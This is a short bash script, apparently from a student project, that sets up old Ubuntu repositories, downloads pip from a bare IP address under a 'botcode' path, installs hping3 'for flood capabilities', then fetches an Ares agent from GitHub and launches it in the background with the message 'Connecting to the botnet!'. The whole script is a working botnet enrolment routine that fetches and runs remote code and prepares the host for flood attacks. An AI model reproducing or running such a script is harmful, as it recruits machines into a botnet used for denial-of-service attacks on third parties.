#! /bin/bash

# Back up existing file
echo "Backing up sources.list file..."
sleep 1
echo ""
echo ""
sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak
echo ""

# Add old repositories for software updates
echo "Adding repositories for software updates..."
sleep 1
echo ""
echo ""
echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy main restricted universe multiverse" >> /etc/apt/sources.list
echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy-updates main restricted universe multiverse" >> /etc/apt/sources.list
echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy-security main restricted universe multiverse" >> /etc/apt/sources.list
echo "deb http://ppa.launchpad.net/python-dev/ppa/ubuntu hardy main" >> /etc/apt/sources.list
echo ""

# Fix PPA GPG Error
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EED4D034D81367B9

# Update repository listing and install base packages
echo "Updating and installing git and Python 2.6..."
sleep 1
echo ""
echo ""
sudo apt-get update
sudo apt-get install git git-core python2.6 -y
echo ""

## Install pip for Python 2.6
echo "Installing pip for Python 2.6"
sleep 1
echo ""
echo ""
cd ~
wget http://192.241.254.93/botcode/get-pip.py
python2.6 get-pip.py
echo ""

# Install Python Requests library
echo "Installing Python Requests library..."
sleep 1
echo ""
echo ""
sudo pip install requests
echo ""

# Download hping for flood capabilities
echo "Installing hping3..."
sleep 1
echo ""
echo ""
sudo apt-get install hping3 -y
echo ""

# Download the bot code and connect
echo "Downloading the bot code..."
cd ~
wget https://github.com/kmanwar89/460SP/archive/master.zip --no-check-certificate
mv master master.zip
unzip master.zip
sleep 1
echo ""
echo ""
echo "Connecting to the botnet!"
cd 460SP-master/Ares/agent/ && python2.6 agent.py &
